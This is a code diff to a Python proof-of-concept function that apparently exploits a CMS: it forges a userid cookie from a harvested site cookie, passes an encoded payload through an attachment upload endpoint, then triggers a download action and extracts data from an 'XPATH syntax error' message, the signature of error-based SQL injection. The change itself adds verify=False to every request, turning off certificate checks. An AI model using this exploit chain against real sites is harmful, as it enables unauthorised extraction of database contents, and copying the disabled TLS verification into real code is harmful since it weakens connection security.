@@ -38,7 +38,7 @@ def __poc(url):
 
     cookies = {}
     step1 = '{}/index.php?m=wap&a=index&siteid=1'.format(url)
-    for c in requests.get(step1, timeout=TIMEOUT).cookies:
+    for c in requests.get(step1, timeout=TIMEOUT, verify=False).cookies:
         if c.name[-7:] == '_siteid':
             cookie_head = c.name[:6]
             cookies[cookie_head + '_userid'] = c.value
@@ -48,7 +48,7 @@ def __poc(url):
         return False
 
     step2 = "{}/index.php?m=attachment&c=attachments&a=swfupload_json&src={}".format(url, quote(payload))
-    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT).cookies:
+    for c in requests.get(step2, cookies=cookies, timeout=TIMEOUT, verify=False).cookies:
         if c.name[-9:] == '_att_json':
             enc_payload = c.value
             break
@@ -56,7 +56,7 @@ def __poc(url):
         return False
 
     setp3 = url + '/index.php?m=content&c=down&a_k=' + enc_payload
-    r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT)
+    r = requests.get(setp3, cookies=cookies, timeout=TIMEOUT, verify=False)
     result = re.findall('XPATH syntax error: \'(.*?)\'', r.content)
     if result[0]:
         return "{} - {}".format(url, result[0])
